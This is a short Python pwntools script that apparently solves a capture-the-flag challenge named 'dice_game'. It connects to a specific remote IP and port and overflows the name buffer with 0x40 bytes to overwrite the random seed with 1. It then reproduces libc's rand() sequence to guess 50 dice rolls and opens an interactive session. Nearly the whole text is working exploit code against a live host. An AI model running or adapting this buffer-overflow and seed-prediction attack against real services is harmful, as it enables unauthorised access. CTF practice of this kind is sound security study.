from pwn import *
from ctypes import *
 
process_name = './dice_game'

p = remote("61.147.171.105",56097)

libc = cdll.LoadLibrary('libc.so.6')
libc.srand(1)
 
payload = b'A' * 0x40 + p64(1)
 
p.sendlineafter('Welcome, let me know your name: ', payload)
 
for i in range(50):
	rand_value = libc.rand() % 6 + 1
	p.sendlineafter('Give me the point(1~6): ', str(rand_value))
 
p.interactive()